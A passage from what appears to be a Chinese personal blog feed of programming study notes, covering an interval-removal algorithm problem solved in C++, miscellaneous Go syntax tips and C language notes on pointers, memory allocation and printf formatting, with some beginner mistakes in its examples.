id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">500 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">150 </span><span class="hljs-number">300</span><br><span class="hljs-symbol">100 </span><span class="hljs-number">200</span><br><span class="hljs-symbol">470 </span><span class="hljs-number">471</span><br></code></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">298<br></code></pre></td></tr></table></figure><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【数据范围】</strong></p><ul><li>对于 $20%$ 的数据，保证区域之间没有重合的部分。</li><li>对于 $100%$ 的数据，保证 $1 \leq l \leq 10^4$，$1 \leq m \leq 100$，$0 \leq u \leq v \leq l$。</li></ul><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Range</span> &#123;<br>    <span class="hljs-type">int</span> begin;<br>    <span class="hljs-type">int</span> end;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">com</span><span class="hljs-params">(Range a, Range b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a.begin == b.begin) &#123;<br>        <span class="hljs-keyword">return</span> a.end &gt; b.end;<span class="hljs-comment">//如果相等，就按照end反向排序</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> a.begin &lt; b.begin;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> sum, n;<br>    cin &gt;&gt; sum &gt;&gt; n;<br>    Range ranges[n];<span class="hljs-comment">//存放范围</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        cin &gt;&gt; ranges[i].begin &gt;&gt; ranges[i].end;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(ranges, ranges + n, com);<br>    sum += <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> maxEnd = <span class="hljs-number">-1</span>;<span class="hljs-comment">//第一次一定会运行到最后</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (ranges[i].end &lt;= maxEnd) &#123;<span class="hljs-comment">//整个范围都被减掉</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; maxEnd &gt;= ranges[i].begin) &#123;<span class="hljs-comment">//前面部分被剪掉</span><br>            sum -= ( ranges[i].end-maxEnd);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//dou&#x27;zai&#x27;wa&#x27;ni</span><br>            sum -= (ranges[i].end - ranges[i].begin + <span class="hljs-number">1</span>);<br>        &#125;<br>        maxEnd=ranges[i].end;<br>    &#125;<br>    cout &lt;&lt; sum;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>抽象成数组</li><li>记得sum+&#x3D;1,因为0处也有树</li><li>通过排序算法，更好的固定范围</li></ul></li><li><p>理解</p><ul><li>将所有的树抽象成为了数周上面的点，然后我们通过范围，判断sum的减数</li><li>本题有三个特殊的情况<ul><li>某一次的范围都在已经减了的范围，由于排了序，我们只需要判断后面的范围</li><li>前面部分已经被减，我们就需要记录的maxEnd来确定范围</li><li>完全没有被减过</li></ul></li></ul></li><li><p>问题</p><p>- </p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go随记</title>
    <link href="/2023/05/08/go/go%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/05/08/go/go%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="go随记"><a href="#go随记" class="headerlink" title="go随记"></a>go随记</h1><ol><li><p>使用<code>make(切片类型，个数)</code>对切片初始化</p></li><li><p><code>var str string=strconv.Itoa(x)</code>将x整形转变为string</p></li><li><p><code>strconv.ParseInt</code> 是将字符串转换为数字的函数</p></li><li><p>数组使用<code>var</code>方式创建会初始化</p></li><li><p><code>copy</code>复制的方式用于切片或者<code>string</code></p></li><li><p>go语言字符是byte,通过码值的形式，实现</p></li><li><p>使用<code>%v</code>打印各种类型</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%25v%E7%9A%84%E5%90%84%E7%A7%8D%E5%BD%A2%E5%BC%8F.png"></p></li><li><p>go语言会自动地初始化</p></li><li><p>全局变量不支持使用自动推导的方式进行初始化</p></li><li><p>使用const模拟枚举</p></li><li><p>在包内的函数，如果是小写，那么只能在包内使用，大写才能在包外正常使用</p></li><li><p>init()，用于包的初始化，优先调用</p></li><li><p>如果对一个包不适用的的话</p><p>可以在前面加入_</p><p>如果包名太长可以在前面加上自己的名字</p><p>如果使用的<code>.</code>则不需要包名，就可使用白里面的函数，但是这样本包就不能写同名函数</p></li><li><p>使用打印函数可以直接打印切片，以及数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//直接声明并且初始化</span><br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>        fmt.Println(v)<br>    &#125;<br>    <br>    <span class="hljs-comment">//先声明再创建空间</span><br>    <span class="hljs-keyword">var</span> ints2 []<span class="hljs-type">int</span><br>    ints2 = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints2 &#123;<br>        fmt.Println(v)<br>    &#125;<br>    fmt.Println(ints)<br>    <br>    ints3 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;<br>    fmt.Println(ints3)<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果切片的长度超了，我们使用<code>append</code>,容量会变成原来的两倍</p></li><li><p>切片的下标截取，相当于得到的是地址，所以当修改截取的数组的时候，原来的数组也会发生变化，如果是使用的是<code>copy</code>则只是一个拷贝</p></li><li><p>类的首字母大写，才能在其他包访问到类</p></li><li><p>go语言的匿名函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>            i := <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>                i++<br>                fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>                time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>            &#125;<br>            fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>    <br>            <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>                <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>                fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>            &#125;()<br>        &#125;() <span class="hljs-comment">//加小括号是为了调用</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>runtime.Goexit()</code>退出当前的<code>goroutine</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>            i := <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>                i++<br>                fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>                time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>            &#125;<br>            fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>    <br>            <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>                <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>                fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>            &#125;()<br>        &#125;() <span class="hljs-comment">//加小括号是为了调用</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言平常笔记</title>
    <link href="/2023/05/07/C/C%E8%AF%AD%E8%A8%80%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/05/07/C/C%E8%AF%AD%E8%A8%80%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言平常笔记"><a href="#C语言平常笔记" class="headerlink" title="C语言平常笔记"></a>C语言平常笔记</h1><ol><li><p>在在自定义函数中使用sqrt函数，必须将开方数，重定义如（double）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">n_prime</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br><span class="hljs-type">int</span> x=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(x=<span class="hljs-number">2</span>;x&lt;<span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)x);x++)<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>==a%x)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is not a prime&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is a prime&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入判断的数：&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>n_prime(num);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>getchar的用法：如果单独只用gerchar(),则只取一个字符。把getcahr 放入循环中则可读取输入进去的所有值，包括（‘\n’,’ ‘）,但是scanf,只读取缓冲区中‘\n’之前的，\n是因为键盘使用了回车</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这是一个计算输入数字中字母，数字，空格，和其他字符的代码</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> arr;<br><span class="hljs-type">int</span> letters=<span class="hljs-number">0</span>,numbers=<span class="hljs-number">0</span>,spaces=<span class="hljs-number">0</span>,others=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入查找的字符串：&quot;</span>);<span class="hljs-comment">//存放得到的字符串</span><br><span class="hljs-keyword">while</span>((arr=getchar())!=<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment">//必须放入循环</span><br>&#123;<br><span class="hljs-keyword">if</span>(arr&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;arr&lt;=<span class="hljs-string">&#x27;z&#x27;</span>||arr&gt;<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;arr&lt;<span class="hljs-string">&#x27;Z&#x27;</span>)<br>&#123;<br>letters++;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(arr&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;arr&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)<br>&#123;<br>numbers++;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27; &#x27;</span>==arr)<br>&#123;<br>spaces++;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>others++;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;letters=%d\nnumber=%d\nspace=%d\nothers=%d\n&quot;</span>,letters,numbers,spaces,others);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>staticu作用：</p><p>3.1 隐藏该语句</p><p>3.2 被static修饰的变量存活时间更长</p><p>3.3 初始化变量为0</p></li><li><p>typedef</p><p>4.1 取别名： typedef 类型 别名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//数组起别名</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br><span class="hljs-built_in">array</span> arr=&#123;<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>&#125;；<span class="hljs-comment">//定义的一维数组</span><br><span class="hljs-built_in">array</span> arr2[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>，<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>，<span class="hljs-number">7</span>，<span class="hljs-number">8</span>&#125;;<span class="hljs-comment">//定义2维数组</span><br><br></code></pre></td></tr></table></figure></li><li><p>指针大小在32位是4，在64位是8</p></li><li><p>输出中间取位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.4d&quot;</span>,a);<br><span class="hljs-comment">//结果位0002</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%4d&quot;</span>,a);<br><span class="hljs-comment">//结果为   2</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%-4d&quot;</span>,a);<br><span class="hljs-comment">//结果为2    (有3个空格)</span><br></code></pre></td></tr></table></figure></li><li><p>sqrt() 函数：括号里里面，放变量名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">A=b*b<span class="hljs-number">-4</span>*a*c;<br><span class="hljs-built_in">sqrt</span>(b*b<span class="hljs-number">-4</span>*a*c);<br><span class="hljs-comment">//不太行</span><br><span class="hljs-built_in">sqrt</span>(A);<br><span class="hljs-comment">//可以</span><br></code></pre></td></tr></table></figure></li><li><p>double,可以用来表示整数</p></li><li><p>取一个高位数，从头开始取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例如</span><br><br>a=x/<span class="hljs-number">10000</span>;<br>b=x%<span class="hljs-number">1000</span>/<span class="hljs-number">100</span>;<br>c=x%<span class="hljs-number">100</span>/<span class="hljs-number">10</span>;<br>d=x%<span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p>乘法符号不能省略</p></li><li><p>如果想使用除法输出小数，先转化再除法</p></li><li><p>define常量，不用加<code>‘;’</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> count 5</span><br><span class="hljs-comment">//就好了</span><br></code></pre></td></tr></table></figure></li><li><p>局部变量是放在栈区上的，栈区内存的使用习惯是，先使用高地址，再使用低地址</p></li><li><p>size_t:它是为了方便系统之间的移植而定义的，不同的系统上，定义size_t 可能不一样。size_t在32位系统上定义为 unsigned int，也就是32位无符号<a href="https://so.csdn.net/so/search?q=%E6%95%B4%E5%9E%8B&spm=1001.2101.3001.7020">整型</a>。在64位系统上定义为 unsigned long ，也就是64位无符号整形</p></li><li><p>清空外部控制台：<code>system(&quot;cls&quot;);</code>,头文件是：<code>stdlib.h</code>。</p></li><li><p><code>void</code>函数<code>return ;</code></p></li><li><p>对于结构体的引用</p><ul><li>若使用地址使用结构体内的成员，使用<code>-&gt;</code></li><li>若直接通过使用结构体的名字则使用：<code>.</code></li></ul></li><li><p>对于链表的使用，应该将所有元素都初始化</p></li><li><p>使用<code>malloc</code>时，需要判断是否申请内存成功</p></li><li><p>判断存储方式</p><ul><li>大端存储：低位存在高地址</li><li>小端存储：低位存放在低地址</li><li>用共同体判断存储方式</li></ul></li><li><p>枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">sex</span>&#123;</span>man, woman&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">sex</span> <span class="hljs-title">chg</span> =</span> <span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);<br>chg = a == <span class="hljs-number">0</span> ? man : woman;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chg=%d&quot;</span>, chg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//如果chg=man,打印0</span><br><span class="hljs-comment">//如果chg=woman,打印1</span><br></code></pre></td></tr></table></figure></li><li><p><code>3.14</code>是double 类型,<code>3.14f</code>是float类型</p></li><li><p>内存释放：只是将使用的部分的内存打上可回收的标记，还是可以修改内存所存的元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input n:&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br><span class="hljs-type">int</span>* p = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">calloc</span>(n, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-keyword">while</span> (i &lt; n)<br>&#123;<br>p[i++] = i;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; n)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p[i++]);<br>&#125;<br><span class="hljs-built_in">free</span>(p);<br>p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\Desktop\笔记\c\平常\C语言平常笔记.assets\image-20221209152359574.png" alt="image-20221209152359574"></p></li><li><p><code>mollioc calloc realloc</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* p=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">calloc</span>(n,size);<span class="hljs-comment">//n:有多少个连续的int,size:只指针对应的类型的大小</span><br><span class="hljs-type">int</span>* p1=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-type">int</span>* p=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">realloc</span>(p,n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<span class="hljs-comment">//n:可用于改变内存（重新申请）</span><br></code></pre></td></tr></table></figure><p>使用<code>calloc</code>会自动初始化，<code>malloc</code>不会</p><p> 使用<code>realloc</code>有两种情况，小扩容，大扩容，小扩容是在原有的内存基础上扩容，大扩容会改变位置</p><p><img src="C:\Users\12414\Desktop\笔记\c\平常\C语言平常笔记.assets\image-20221209153159341.png" alt="image-20221209153159341"></p></li><li><p>自己的交换函数，不能交换地址，交换地址对应的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span> <span class="hljs-params">( <span class="hljs-type">int</span> *a,  <span class="hljs-type">int</span> *b )</span><br>&#123;<br><span class="hljs-type">int</span> p;<br>p=*a;<br>*a=*b;<br>*b=p;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>不能再自己的函数里面计算，数组的长度，因为，接受的是首地址</p></li><li><p>可以通过字写的程序计算，数组里面的字符（字符串特别适用，数字注意0）</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初始go</title>
    <link href="/2023/05/07/go/%E5%88%9D%E5%A7%8Bgo/"/>
    <url>/2023/05/07/go/%E5%88%9D%E5%A7%8Bgo/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="初始GO"><a href="#初始GO" class="headerlink" title="初始GO"></a>初始GO</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3><ol><li><p>一个项目只有一个包<code>main</code></p><p>而且在<code>main</code>里面有一个<code>func main</code></p></li></ol><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//单行注释</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="简单的程序"><a href="#简单的程序" class="headerlink" title="简单的程序"></a>简单的程序</h3><ol><li><p>小程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;awd&quot;</span><br>fmt.Println(name)<br>name = <span class="hljs-string">&quot;Awdawd&quot;</span><br>fmt.Println(name)<br><span class="hljs-keyword">var</span> Int <span class="hljs-type">int</span> = <span class="hljs-number">2</span><br>fmt.Println(Int, name)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>注意<code>Println</code>的不一样的用法</li></ul></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ol><li><p>声明变量</p><ul><li><p>定义单个变量</p><p><code>var 变量名 变量的类型</code></p><p><code>var 变量名</code></p><p><code>变量名 := </code></p></li><li><p>定义多个变量</p><figure class="highlight go"><table><tr><td 